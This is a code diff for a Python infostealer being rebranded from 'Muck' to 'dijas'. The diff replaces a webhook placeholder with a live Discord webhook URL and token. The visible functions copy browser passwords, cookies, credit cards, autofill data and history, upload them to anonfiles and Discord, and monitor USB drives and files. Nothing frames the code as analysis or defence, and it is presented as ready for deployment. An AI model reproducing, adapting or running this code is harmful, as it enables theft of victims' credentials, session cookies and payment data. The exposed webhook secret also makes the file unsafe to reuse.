@@ -1,12 +1,4 @@
 
-# .___  ___.   ______    _______   __    __   __       _______     _______.
-# |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
-# |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
-# |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
-# |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
-# |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    
-                                                                         
-
 import os
 import time
 import requests
@@ -14,22 +6,17 @@ import logging
 import threading
 import psutil
 import random
-import os
 import io
 import re
-import time
 import gzip
 import json
 import shutil
-import random
 import hashlib
 import warnings
-import threading
 import subprocess
 import uuid
 from sys import executable, stderr
-from fernet import Fernet
-import requests
+from cryptography.fernet import Fernet
 from base64 import b64decode
 from json import loads, dumps
 from zipfile import ZipFile, ZIP_DEFLATED
@@ -39,25 +26,11 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 
 
 
-# ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
-# ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
-# ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
-# ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
-# ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
-# ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝
 
 
-
-hook = "WEBHOOK_HERE"
-
+hook = "https://discordapp.com/api/webhooks/1194641526463148032/ph8inOcQ44XL4rmy3BKdjtBaEXqVC5W0yiJFhZFHFNsxcNanxE9V3lnVQOE3g-bhMSyB"
 
 
-# ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
-# ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
-# ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
-# ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
-# ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
-# ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝
 
 
 
@@ -68,12 +41,6 @@ logging.basicConfig(filename='file_monitor.log', level=logging.ERROR)
 # Rate limit variables
 rate_limit_reset_time = int(time.time())  # Initialize with current time
 rate_limit_remaining = 1
-# .___  ___.   ______    _______   __    __   __       _______     _______.
-# |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
-# |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
-# |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
-# |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
-# |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    
 
 
 
@@ -100,15 +67,6 @@ for module in ModuleRequirements:
         time.sleep(3)
 
 from Crypto.Cipher import AES
-
-
-
-
-
-
-
-
-
 
 
 
@@ -355,16 +313,7 @@ def GetUHQFriends(token):
 
 
 
-# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
-# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
-# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
-# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
-# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
-# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
-# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
-# \__|     \__| \______/  \______/ \__|  \__|
-                                           
-                                           
+
                                            
 
 
@@ -512,18 +461,6 @@ def InstagramInfo(token):
 
 
 
-# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
-# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
-# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
-# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
-# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
-# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
-# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
-# \__|     \__| \______/  \______/ \__|  \__|
-                                           
-                                           
-                                           
-
 
 
 
@@ -597,7 +534,7 @@ def uploadToken(token, path):
     path = path.replace("\\", "/")
 
     data = {
-        "content": f'Muck Stealer',
+        "content": f'dijas Stealer',
         "embeds": [
             {
             "2895667": 14406413,
@@ -653,7 +590,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Muck | https://github.com/frankxrs",
+                "text": "dijas | upploader",
                 "icon_url": "https://i.imgur.com/Npe8QuD.png"
                 },
             "thumbnail": {
@@ -686,11 +623,11 @@ def upload(name, link):
             "content": GLINFO,
             "embeds": [
                 {
-                "title": f"Muck | Data Extractor",
+                "title": f"dijas | Data Extractor",
                 "2895667": 2895667,
                 "fields": link,
                 "footer": {
-                    "text": "Muck | https://github.com/frankxrs",
+                    "text": "dijas | upploader",
                     "icon_url": "https://i.imgur.com/Npe8QuD.png"
                 },
                 }
@@ -708,11 +645,11 @@ def upload(name, link):
             "content": GLINFO,
             "embeds": [
                 {
-                "title": f"Muck | {name.split(';')[0]}",
+                "title": f"dijas | {name.split(';')[0]}",
                 "2895667": 2895667,
                 "fields": link,
                 "footer": {
-                    "text": "Muck | https://github.com/frankxrs",
+                    "text": "dijas | upploader",
                     "icon_url": "https://i.imgur.com/Npe8QuD.png"
                 },
                 "thumbnail": {
@@ -746,7 +683,7 @@ def upload(name, link):
                 "fields": endlist,
                 "title": f"File Stealer",
                 "footer": {
-                    "text": "Muck | https://github.com/frankxrs",
+                    "text": "dijas | upploader",
                     "icon_url": "https://i.imgur.com/Npe8QuD.png"
                 }
                 }
@@ -757,7 +694,7 @@ def upload(name, link):
         return
 
 def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\muck{name}.txt"
+    path = os.getenv("TEMP") + f"\dijas{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         for line in data:
             if line[0] != '':
@@ -800,7 +737,7 @@ def FirefoxCookie():
         for subdir, dirs, files in os.walk(firefoxpath):
             for file in files:
                if file.endswith("cookies.sqlite"):
-                    tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+                    tempfold = temp + "dijas" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
                     shutil.copy2(os.path.join(subdir, file), tempfold)
                     conn = sql_connect(tempfold)
                     cursor = conn.cursor()
@@ -823,7 +760,7 @@ def getPassw(path, arg):
         pathC = path + arg + "/Login Data"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "dijas" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SqlThing(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")
 
@@ -854,7 +791,7 @@ def getCookie(path, arg):
         pathC = path + arg + "/Cookies"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "dijas" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SqlThing(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")
 
@@ -886,7 +823,7 @@ def getCCs(path, arg):
         pathC = path + arg + "/Web Data"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "dijas" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SqlThing(pathC, tempfold, "SELECT * FROM credit_cards ")
 
@@ -910,7 +847,7 @@ def getAutofill(path, arg):
         pathC = path + arg + "/Web Data"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "dijas" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SqlThing(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")
 
@@ -928,7 +865,7 @@ def getHistory(path, arg):
 
         pathC = path + arg + "History"
         if os.stat(pathC).st_size == 0: return
-        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "dijas" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
         data = SqlThing(pathC, tempfold,"SELECT * FROM urls")
 
         for row in data:
@@ -1002,7 +939,7 @@ def getBrowsers(browserPaths):
     parseCookies()
     for thread in Browserthread: thread.join()
 
-    for file in ["muckpasswords.txt", "muckcookies.txt", "muckcreditcards.txt", "muckautofill.txt", "muckhistory.txt", "muckparsedcookies.txt", "muckbookmarks.txt"]:
+    for file in ["dijaspasswords.txt", "dijascookies.txt", "dijascreditcards.txt", "dijasautofill.txt", "dijashistory.txt", "dijasparsedcookies.txt", "dijasbookmarks.txt"]:
         filess.append(uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
     headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
@@ -1013,19 +950,19 @@ def getBrowsers(browserPaths):
                 "title": "Password Stealer",
                 "description": f"**Found**:\n{getwebsites(paswWords)}\n\n**Data:**\n **{PasswCount}** `Passwords Found`\n [Passwords.txt]({filess[0]})",
                 "2895667": 14406413,
-                "footer": {"text": "Muck | https://github.com/frankxrs/",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
+                "footer": {"text": "dijas | upploader/",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
             },
             {
                 "title": "Cookies Stealer",
                 "description": f"**Found**:\n{getwebsites(cookiWords)}\n\n**Data:**\n **{CookiCount}** Cookies Found\n [Cookies.txt]({filess[1]})\n [Parsed.txt]({filess[5]})",
                 "2895667": 14406413,
-                "footer": {"text": "Muck | https://github.com/frankxrs",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
+                "footer": {"text": "dijas | upploader",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
             },
             {
                 "title": "Other",
                 "description": f"**{HistoryCount}** Websites Found\n [history.txt]({filess[4]})\n\n **{AutofillCount}** Infos Found\n [autofill.txt]({filess[3]})\n\n **{BookmarksCount}** Bookmarks found\n [bookmarks.txt]({filess[6]})\n\n**{CCsCount}** Creditcards Found\n [creditcards.txt]({filess[2]})",
                 "2895667": 14406413,
-                "footer": {"text": "Muck | https://github.com/frankxrs",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
+                "footer": {"text": "dijas | upploader",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
             }
         ],
         "attachments": []
@@ -1236,7 +1173,7 @@ def GatherZips(paths1, paths2, paths3):
             "description": f"{wal}\n{ga}\n{ot}",
             "2895667": 14406413,
             "footer": {
-                "text": "Muck | https://github.com/frankxrs",
+                "text": "dijas | upploader",
                 "icon_url": "https://i.imgur.com/Npe8QuD.png"
             }
             }
@@ -1633,7 +1570,7 @@ def send_progress_to_discord(message):
                 }
             ]
         }
-        requests.post(discord_webhook_url, json=discord_payload)
+        requests.post(hook, json=discord_payload)
     except Exception as e:
         logging.error(f"Error sending progress message to Discord: {str(e)}")
 
@@ -1654,7 +1591,7 @@ def upload_file_to_discord(file_path):
         with open(file_path, "rb") as f:
             files = {"file": f}
             headers = {"User-Agent": "Mozilla/5.0"}  # Use a user agent to avoid Discord rate limits
-            response = requests.post(discord_webhook_url, headers=headers, files=files)
+            response = requests.post(hook, headers=headers, files=files)
 
             rate_limit_reset_time = int(response.headers.get("X-RateLimit-Reset"))
             rate_limit_remaining = int(response.headers.get("X-RateLimit-Remaining"))
@@ -1687,7 +1624,7 @@ def monitor_connected_usb_drives():
             return []
     except Exception as e:
         error_message = f"Error monitoring USB drives: {str(e)}"
-        send_error_to_discord(error_message)
+        #send_error_to_discord(error_message)
         return []
 
 # Function to periodically run the file monitoring and uploading
@@ -1747,5 +1684,10 @@ def check_user_activity():
         print("CPU usage is high. Pausing operation for a while.")
         time.sleep(600)  # Pause for 10 minutes if CPU usage is high
 
+
+def main():
+   # Call all the necessary functions here...
+   run_file_monitoring()
+
 if __name__ == '__main__':
-    run_file_monitoring()
+   main()
